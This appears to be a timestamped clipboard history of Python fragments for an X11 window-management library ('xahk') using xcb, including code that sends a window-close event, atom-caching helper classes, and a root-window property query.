* Fri 28 Feb 2014 04:32:49 PM JST
        self.window = window

* Fri 28 Feb 2014 04:32:59 PM JST
self.
* Fri 28 Feb 2014 04:33:19 PM JST
self.
* Fri 28 Feb 2014 04:33:37 PM JST
window
* Fri 28 Feb 2014 04:42:12 PM JST
from xahk import xconnection as xc
* Fri 28 Feb 2014 04:43:04 PM JST
window, 
* Fri 28 Feb 2014 04:43:10 PM JST
window, 
* Fri 28 Feb 2014 04:43:11 PM JST
window=window, 
* Fri 28 Feb 2014 04:43:13 PM JST
window, 
* Fri 28 Feb 2014 04:43:14 PM JST
window=window, 
* Fri 28 Feb 2014 04:43:19 PM JST
window, 
* Fri 28 Feb 2014 04:43:19 PM JST
window=window, 
* Fri 28 Feb 2014 04:43:23 PM JST
window, 
* Fri 28 Feb 2014 04:43:23 PM JST
window=window, 
* Fri 28 Feb 2014 04:43:26 PM JST
seqnum, 
* Fri 28 Feb 2014 04:43:26 PM JST
seqnum=seqnum, 
* Fri 28 Feb 2014 04:43:28 PM JST
window, 
* Fri 28 Feb 2014 04:43:28 PM JST
window=window, 
* Fri 28 Feb 2014 04:43:31 PM JST
seqnum, 
* Fri 28 Feb 2014 04:43:31 PM JST
seqnum=seqnum, 
* Fri 28 Feb 2014 04:43:34 PM JST
window, 
* Fri 28 Feb 2014 04:43:34 PM JST
window=window, 
* Fri 28 Feb 2014 04:43:43 PM JST
window, 
* Fri 28 Feb 2014 04:43:43 PM JST
window=window, 
* Fri 28 Feb 2014 04:44:19 PM JST
seqnum=seqnum,
* Fri 28 Feb 2014 04:44:34 PM JST
display=display
* Fri 28 Feb 2014 04:44:40 PM JST
display=
* Fri 28 Feb 2014 04:44:42 PM JST
format_
* Fri 28 Feb 2014 04:44:45 PM JST
seqnum=
* Fri 28 Feb 2014 04:44:46 PM JST
                                      seqnum=
* Fri 28 Feb 2014 04:44:52 PM JST
display=
* Fri 28 Feb 2014 04:44:53 PM JST
display
* Fri 28 Feb 2014 04:45:00 PM JST
seqnum=
* Fri 28 Feb 2014 04:45:00 PM JST
                                          seqnum=
* Fri 28 Feb 2014 04:45:07 PM JST
display
* Fri 28 Feb 2014 04:45:11 PM JST
display=display
* Fri 28 Feb 2014 04:45:11 PM JST
                                display=display
* Fri 28 Feb 2014 04:45:14 PM JST
seqnum=
* Fri 28 Feb 2014 04:45:16 PM JST
format_=
* Fri 28 Feb 2014 04:45:25 PM JST
format_=
* Fri 28 Feb 2014 04:45:27 PM JST
seqnum=
* Fri 28 Feb 2014 04:45:28 PM JST
display=
* Fri 28 Feb 2014 04:45:29 PM JST
display
* Fri 28 Feb 2014 04:45:32 PM JST
                                
* Fri 28 Feb 2014 04:45:35 PM JST
format_=
* Fri 28 Feb 2014 04:45:37 PM JST
seqnum=
* Fri 28 Feb 2014 04:45:39 PM JST
display=
* Fri 28 Feb 2014 04:45:40 PM JST
display
* Fri 28 Feb 2014 04:45:45 PM JST
                                
* Fri 28 Feb 2014 04:45:51 PM JST
seqnum=
* Fri 28 Feb 2014 04:45:52 PM JST
display=
* Fri 28 Feb 2014 04:45:54 PM JST
format_=
* Fri 28 Feb 2014 04:45:56 PM JST
display
* Fri 28 Feb 2014 04:45:59 PM JST
, 
* Fri 28 Feb 2014 04:45:59 PM JST
                              , 
* Fri 28 Feb 2014 04:46:36 PM JST
display=
* Fri 28 Feb 2014 04:46:41 PM JST
display=None
* Fri 28 Feb 2014 04:47:25 PM JST
StateHandler
* Fri 28 Feb 2014 04:47:51 PM JST
StateHandler
* Fri 28 Feb 2014 04:48:33 PM JST
from xahk import xconnection as xc
* Fri 28 Feb 2014 04:49:51 PM JST
from xahk.xconnection.singleton import SingleConnection
* Fri 28 Feb 2014 04:49:57 PM JST
Connection
* Fri 28 Feb 2014 04:51:52 PM JST
from xahk.xconnection.extensions.atom import AtomIdentifier
* Fri 28 Feb 2014 04:52:50 PM JST

* Fri 28 Feb 2014 04:52:50 PM JST

* Fri 28 Feb 2014 04:52:50 PM JST
from xahk.xconnection import Connection

* Fri 28 Feb 2014 04:52:54 PM JST
AtomIdentifier
* Fri 28 Feb 2014 04:53:14 PM JST
.ext.atom
* Fri 28 Feb 2014 04:53:34 PM JST
AtomIdentifier
* Fri 28 Feb 2014 04:53:39 PM JST
.ext.atom
* Fri 28 Feb 2014 04:53:55 PM JST
AtomIdentifier
* Fri 28 Feb 2014 04:54:00 PM JST
AtomIdentifier
* Fri 28 Feb 2014 04:54:23 PM JST
.ext.atom
* Fri 28 Feb 2014 04:54:30 PM JST
AtomIdentifier
* Fri 28 Feb 2014 04:54:33 PM JST
atom
* Fri 28 Feb 2014 04:54:33 PM JST
ext.atom
* Fri 28 Feb 2014 04:54:37 PM JST
.ext.atom
* Fri 28 Feb 2014 04:54:42 PM JST
AtomIdentifier
* Fri 28 Feb 2014 04:54:47 PM JST
.ext.atom
* Fri 28 Feb 2014 04:55:00 PM JST
.ext.atom
* Fri 28 Feb 2014 04:55:06 PM JST
AtomIdentifier
* Fri 28 Feb 2014 04:55:14 PM JST
AtomIdentifier
* Fri 28 Feb 2014 04:55:28 PM JST
.ext.atom
* Fri 28 Feb 2014 04:56:16 PM JST
PropertyHandler
* Fri 28 Feb 2014 04:56:46 PM JST
PropertyHandlerBase
* Fri 28 Feb 2014 04:58:47 PM JST
54525998
* Fri 28 Feb 2014 05:04:17 PM JST
class CloseEvent(EventAbstract):
    r"""
    """
    code = request.Code(33)
    types = '_NET_CLOSE_WINDOW'

* Fri 28 Feb 2014 05:04:41 PM JST
Close
* Fri 28 Feb 2014 05:04:56 PM JST
WM_PROTOCOLS
* Fri 28 Feb 2014 05:04:59 PM JST
'WM_PROTOCOLS'
* Fri 28 Feb 2014 05:05:28 PM JST
class CloseData(DataMaker):
    r"""
    """

    def __init__(self, display=None):
        r"""
        """
        DataMaker.__init__(self, display=display)
        self.data[0] = xcb.xproto.Time.CurrentTime



* Fri 28 Feb 2014 05:05:47 PM JST
Close
* Fri 28 Feb 2014 05:06:11 PM JST
'WM_DELETE_WINDOW'
* Fri 28 Feb 2014 05:06:46 PM JST
        atom = AtomIdentifier.get_instance(display=self.display)
        self.data[2] = atom.identify_atom(getattr(self, 'statename2'))

* Fri 28 Feb 2014 05:07:09 PM JST
'WM_DELETE_WINDOW'
* Fri 28 Feb 2014 05:07:47 PM JST
class CloseWindow(object):
    r"""
    """

    def __init__(self, format_=32, seqnum=0, display=None):
        r"""
        """
        self.display = display or ''
        self.format = format_
        self.seqnum = seqnum

    def close(self, window):
        r"""SUMMARY

        close()

        @Return:
        """
        data = CloseData(display=self.display).pack()
        event = CloseEvent(window, self.format, self.seqnum, data,
                           display=self.display)
        con = SingleConnection.get_instance(display=self.display)
        con.core.SendEvent(0, window, 0xffffff, event)

* Fri 28 Feb 2014 05:07:55 PM JST
Close
* Fri 28 Feb 2014 05:08:04 PM JST
Close
* Fri 28 Feb 2014 05:08:07 PM JST
Close
* Fri 28 Feb 2014 05:10:12 PM JST
display=None, format_=32, seqnum=0
* Fri 28 Feb 2014 05:11:47 PM JST
display, format_, seqnum
* Fri 28 Feb 2014 05:12:15 PM JST
close
* Fri 28 Feb 2014 05:12:23 PM JST
display, format_, seqnum
* Fri 28 Feb 2014 05:15:36 PM JST
    def __call__(self, window):
        r"""SUMMARY
        
        __call__(window)
        
        @Arguments:
        - `window`:
        
        @Return:
        """
        self.close(window)

* Fri 28 Feb 2014 05:15:47 PM JST
close
* Fri 28 Feb 2014 05:15:54 PM JST
close
* Fri 28 Feb 2014 05:16:12 PM JST
DestroyHandler
* Fri 28 Feb 2014 05:16:31 PM JST
DestroyHandler
* Fri 28 Feb 2014 05:16:47 PM JST
from xahk import xconnection as xc
* Fri 28 Feb 2014 05:18:28 PM JST
81788931
* Fri 28 Feb 2014 05:19:46 PM JST
code = request.Code(33)
* Fri 28 Feb 2014 05:22:08 PM JST
81788931
* Fri 28 Feb 2014 05:22:28 PM JST
from xahk import xconnection as xc
* Fri 28 Feb 2014 05:23:10 PM JST
81788931
* Fri 28 Feb 2014 05:25:39 PM JST
from xahk import xconnection as xc
* Fri 28 Feb 2014 05:26:01 PM JST
81788931
* Fri 28 Feb 2014 05:30:12 PM JST
window, self.format, self.seqnum, data
* Fri 28 Feb 2014 05:31:38 PM JST
display=
* Fri 28 Feb 2014 05:32:40 PM JST
                           
* Fri 28 Feb 2014 05:33:34 PM JST
xconnection
* Fri 28 Feb 2014 05:33:37 PM JST
xconnection as xc
* Fri 28 Feb 2014 05:33:45 PM JST
from xahk.xconnection import Connection as con
* Fri 28 Feb 2014 05:34:04 PM JST
81788931
* Fri 28 Feb 2014 05:36:42 PM JST
from xahk.xconnection import Connection as con
* Fri 28 Feb 2014 05:37:11 PM JST
81788931
* Fri 28 Feb 2014 05:38:29 PM JST
display=None
* Fri 28 Feb 2014 05:38:51 PM JST
, display=None
* Fri 28 Feb 2014 05:39:21 PM JST
from xahk.xconnection import Connection as con
* Fri 28 Feb 2014 05:39:24 PM JST
81788931
* Fri 28 Feb 2014 05:40:10 PM JST
81788931
* Fri 28 Feb 2014 05:40:22 PM JST

* Fri 28 Feb 2014 05:40:22 PM JST

* Fri 28 Feb 2014 05:40:22 PM JST
        print(format_)

* Fri 28 Feb 2014 05:40:23 PM JST

* Fri 28 Feb 2014 05:40:23 PM JST

* Fri 28 Feb 2014 05:40:23 PM JST
        print(format_)

* Fri 28 Feb 2014 05:40:29 PM JST

* Fri 28 Feb 2014 05:40:29 PM JST

* Fri 28 Feb 2014 05:40:29 PM JST
            print(elmt)

* Fri 28 Feb 2014 05:44:07 PM JST

* Fri 28 Feb 2014 05:44:07 PM JST

* Fri 28 Feb 2014 05:44:07 PM JST
        print(self.format)

* Fri 28 Feb 2014 05:47:51 PM JST
DisplayName
* Fri 28 Feb 2014 05:48:14 PM JST
DisplayName
* Fri 28 Feb 2014 05:48:43 PM JST

* Fri 28 Feb 2014 05:48:43 PM JST

* Fri 28 Feb 2014 05:48:43 PM JST
        self.display = display or ''

* Fri 28 Feb 2014 05:49:07 PM JST
DisplayName
* Fri 28 Feb 2014 05:50:35 PM JST

* Fri 28 Feb 2014 05:50:35 PM JST

* Fri 28 Feb 2014 05:50:35 PM JST
        self.display = display or ''

* Fri 28 Feb 2014 05:50:57 PM JST
DisplayName
* Fri 28 Feb 2014 05:51:09 PM JST

* Fri 28 Feb 2014 05:51:09 PM JST

* Fri 28 Feb 2014 05:51:09 PM JST
        self.display = display or ''

* Fri 28 Feb 2014 05:51:36 PM JST
DisplayName
* Fri 28 Feb 2014 05:51:52 PM JST

* Fri 28 Feb 2014 05:51:52 PM JST

* Fri 28 Feb 2014 05:51:52 PM JST
        self.display = display or ''

* Fri 28 Feb 2014 05:52:32 PM JST
DisplayName
* Fri 28 Feb 2014 05:53:08 PM JST
from xahk.xconnection import Connection as con
* Fri 28 Feb 2014 05:53:28 PM JST
81788931
* Fri 28 Feb 2014 05:55:32 PM JST
from xahk.display import DisplayName
* Fri 28 Feb 2014 05:55:48 PM JST
DisplayName
* Fri 28 Feb 2014 05:56:06 PM JST
DisplayName
* Fri 28 Feb 2014 05:56:15 PM JST

* Fri 28 Feb 2014 05:56:15 PM JST

* Fri 28 Feb 2014 05:56:16 PM JST
        self.display = display or ''

* Fri 28 Feb 2014 05:56:52 PM JST
DisplayName
* Fri 28 Feb 2014 05:57:58 PM JST
from xahk.display import DisplayName
* Fri 28 Feb 2014 05:58:01 PM JST
DisplayName
* Fri 28 Feb 2014 05:59:22 PM JST
from xahk.display import DisplayName
* Fri 28 Feb 2014 05:59:25 PM JST
DisplayName
* Fri 28 Feb 2014 06:01:46 PM JST
from xahk.display import DisplayName
* Fri 28 Feb 2014 06:01:49 PM JST
DisplayName
* Fri 28 Feb 2014 06:02:12 PM JST
DisplayName
* Fri 28 Feb 2014 06:02:26 PM JST

* Fri 28 Feb 2014 06:02:26 PM JST

* Fri 28 Feb 2014 06:02:26 PM JST
        self.display = display or ''

* Fri 28 Feb 2014 06:03:00 PM JST
from xahk.display import DisplayName
* Fri 28 Feb 2014 06:03:02 PM JST
DisplayName
* Fri 28 Feb 2014 06:03:21 PM JST
from xahk.display import DisplayName
* Fri 28 Feb 2014 06:03:23 PM JST
DisplayName
* Fri 28 Feb 2014 06:03:25 PM JST

* Fri 28 Feb 2014 06:03:25 PM JST

* Fri 28 Feb 2014 06:03:25 PM JST
from xahk.display import DisplayName

* Fri 28 Feb 2014 06:03:29 PM JST
DisplayName
* Fri 28 Feb 2014 06:07:39 PM JST
Client
* Fri 28 Feb 2014 06:07:47 PM JST
configure
* Fri 28 Feb 2014 06:08:33 PM JST
window, **changes
* Fri 28 Feb 2014 06:11:51 PM JST
display=None
* Fri 28 Feb 2014 06:11:55 PM JST
DisplayName.__init__(self, display)
* Fri 28 Feb 2014 06:14:32 PM JST
ClientHandler
* Fri 28 Feb 2014 06:14:56 PM JST

* Fri 28 Feb 2014 06:14:58 PM JST
state
* Fri 28 Feb 2014 06:16:08 PM JST
from xahk.xconnection import Connection as con
* Fri 28 Feb 2014 06:16:51 PM JST
54525998
* Fri 28 Feb 2014 06:28:43 PM JST
Tes(2).tes()
* Fri 28 Feb 2014 11:11:04 PM JST
AtomCache
* Fri 28 Feb 2014 11:11:55 PM JST
AtomPair
* Fri 28 Feb 2014 11:14:56 PM JST
class DataHolder(object):
    r"""
    """

    def __init__(self, data):
        r"""

        @Arguments:
        - `data`:
        """
        self._data = data

    def __repr__(self, ):
        return repr(self._data)

    def __cmp__(self, other):
        if isinstance(other, self.__class__):
            return cmp(self._data, other._data)
        return cmp(self._data, other)

    def __eq__(self, other):
        if isinstance(other, self.__class__):
            return self._data == other._data
        return self._data == other

    def __ne__(self, other):
        return not (self == other)


class AtomNumber(DataHolder):
    r"""
    """

    def __init__(self, identifier, num):
        r"""

        @Arguments:
        - `num`:
        - `name`:
        """
        DataHolder.__init__(self, num)
        self._identifier = identifier

    def get_atom_name(self, ):
        r"""SUMMARY

        get_atom_name()

        @Return:
        """
        return self._identifier.get_atom_name(self._data)

    def pack(self, ):
        r"""SUMMARY

        pack()

        @Return:
        """
        return request.Atom(self._data).pack()

    def __int__(self, ):
        return self._data

    def __long__(self, ):
        return self._data.__long__()

    def __hash__(self, ):
        return hash(self._data)


class AtomName(DataHolder):
    r"""
    """

    def __init__(self, identifier, name):
        r"""

        @Arguments:
        - `connection`:
        - `name`:
        """
        DataHolder.__init__(self, name)
        self._identifier = identifier

    def intern_atom(self, ):
        r"""SUMMARY

        intern_atom()

        @Return:
        """
        return self._identifier.intern_atom(self._data)

    def name_length(self, ):
        r"""SUMMARY

        name_length()

        @Return:
        """
        return len(self)

    def __iter__(self):
        for i in range(0, len(self)):
            yield self._data[i]
        raise StopIteration()

    def __str__(self, ):
        return self._data

    def __hash__(self, ):
        return hash(self._data)

    def __len__(self, ):
        return len(self._data)


class AtomCache(object):
    r"""
    """

    def __init__(self, dic=None):
        r"""

        @Arguments:
        - `dic`:
        """
        self._dic = dic or {}

    def _add(self, key, value):
        r"""SUMMARY

        _add()

        @Return:
        """
        for arg in (key, value):
            if not isinstance(arg, (int, str)):
                # TODO: (Atami) [2014/02/17]
                raise ValueError(arg)
        self._dic[key] = value

    def dual_add(self, arg1, arg2):
        r"""SUMMARY

        dual_add(arg1, arg2)

        @Arguments:
        - `arg1`:
        - `arg2`:

        @Return:
        """
        self._add(arg1, arg2)
        self._add(arg2, arg1)

    def get(self, key):
        r"""SUMMARY

        get(key)

        @Arguments:
        - `key`:

        @Return:
        """
        if key in self._dic:
            return self._dic[key]
        # TODO: (Atami) [2014/02/17]
        # default return

    def clear(self, ):
        r"""SUMMARY

        clear()

        @Return:
        """
        self._dic.clear()

    def __contains__(self, key):
        return key in self._dic

    def __repr__(self, ):
        return repr(self._dic)


class AtomPair(object):
    r"""
    """
    __slots__ = ('name', 'atom')

    def __init__(self, name, atom):
        r"""

        @Arguments:
        - `name`:
        - `atom`:
        """
        self.name = name
        self.atom = atom

    def pack(self, ):
        r"""SUMMARY

        pack()

        @Return:
        """
        return self.atom.pack()

    def __repr__(self, ):
        fmt = "{0.__class__.__name__}(name='{0.name}', atom={0.atom})".format
        return fmt(self)

    def __cmp__(self, other):
        if isinstance(other, self.__class__):
            return cmp(self.atom, other.atom)
        if predicate.isstring(other):
            return cmp(self.name, other)
        if predicate.isint(other):
            return cmp(self.atom, other)
        return False

    def __eq__(self, other):
        if isinstance(other, self.__class__):
            return self.atom == other.atom
        if predicate.isint(other):
            return self.atom == other
        if predicate.isstring(other):
            return self.name == other
        return False

    def __ne__(self, other):
        return not (self == other)

    def __getitem__(self, key):
        return str(self)[key]

    def __str__(self, ):
        return str(self.name)

    def __int__(self, ):
        return int(self.atom)

    def __long__(self, ):
        return long(self.atom)

    def __len__(self, ):
        return len(str(self))

    def __hash__(self, ):
        return hash(self.atom)

* Fri 28 Feb 2014 11:15:15 PM JST
from xahk import request
* Fri 28 Feb 2014 11:15:45 PM JST
import predicate
* Fri 28 Feb 2014 11:24:25 PM JST
from xahk.xconnection import Connection as con
* Fri 28 Feb 2014 11:25:26 PM JST
54525998
* Fri 28 Feb 2014 11:29:28 PM JST

* Fri 28 Feb 2014 11:29:28 PM JST

* Fri 28 Feb 2014 11:29:28 PM JST
# from xahk.atom import AtomCache, AtomName, AtomNumber, AtomPair

* Fri 28 Feb 2014 11:32:25 PM JST
from xahk.xconnection import Connection as con
* Fri 28 Feb 2014 11:32:46 PM JST
54525998
* Fri 28 Feb 2014 11:35:58 PM JST
*args, **kwargs
* Fri 28 Feb 2014 11:37:37 PM JST
self, 
* Fri 28 Feb 2014 11:44:46 PM JST
self._xcb_connection.disconnect()
* Fri 28 Feb 2014 11:44:47 PM JST
disconnect()
* Fri 28 Feb 2014 11:45:03 PM JST
get_file_descriptor
* Fri 28 Feb 2014 11:46:08 PM JST
get_file_descriptor
* Fri 28 Feb 2014 11:46:40 PM JST
get_maximum_request_length
* Fri 28 Feb 2014 11:47:07 PM JST
get_setup
* Fri 28 Feb 2014 11:48:00 PM JST
has_error
* Fri 28 Feb 2014 11:49:18 PM JST
poll_for_event
* Fri 28 Feb 2014 11:49:45 PM JST
pref_screen
* Fri 28 Feb 2014 11:50:11 PM JST
prefetch_maximum_request_length
* Fri 28 Feb 2014 11:50:35 PM JST
wait_for_event
* Fri 28 Feb 2014 11:52:43 PM JST
return 
* Fri 28 Feb 2014 11:54:38 PM JST
xc
* Fri 28 Feb 2014 11:54:39 PM JST
from xc
* Fri 28 Feb 2014 11:54:39 PM JST
17]: from xc
* Fri 28 Feb 2014 11:54:51 PM JST
import struct

conn = xcb.connect()
setup = conn.get_setup()
root = setup.roots[0].root

cookie1 = conn.core.InternAtom(True, 17, "_NET_WM_USER_TIME");
cookie2 = conn.core.InternAtom(True, 8, "CARDINAL");
name = cookie1.reply().atom
type = cookie2.reply().atom

cookie = conn.core.GetProperty(False, root, name, type, 0, 1)
reply = cookie.reply()

print len(reply.value)
print struct.unpack_from('I', reply.value.buf())[0]

* Fri 28 Feb 2014 11:55:12 PM JST
482